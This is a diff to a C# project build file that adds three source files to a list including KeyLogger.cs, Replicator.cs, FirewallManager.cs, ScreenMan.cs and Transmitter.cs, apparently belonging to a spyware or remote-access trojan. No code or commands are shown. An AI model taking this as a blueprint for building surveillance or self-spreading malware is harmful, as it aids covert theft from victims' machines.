@@ -88,7 +88,9 @@
     <Compile Include="FirewallManager.cs" />
     <Compile Include="General.cs" />
     <Compile Include="Handler.cs" />
+    <Compile Include="HandlerInitData.cs" />
     <Compile Include="Http.cs" />
+    <Compile Include="Imaging.cs" />
     <Compile Include="KeyLogger.cs" />
     <Compile Include="Net.cs" />
     <Compile Include="OS.cs" />
@@ -96,6 +98,7 @@
     <Compile Include="Properties\AssemblyInfo.cs" />
     <Compile Include="Replicator.cs" />
     <Compile Include="ScreenMan.cs" />
+    <Compile Include="Security.cs" />
     <Compile Include="Settings.cs" />
     <Compile Include="Transmitter.cs" />
     <Compile Include="Watcher.cs" />
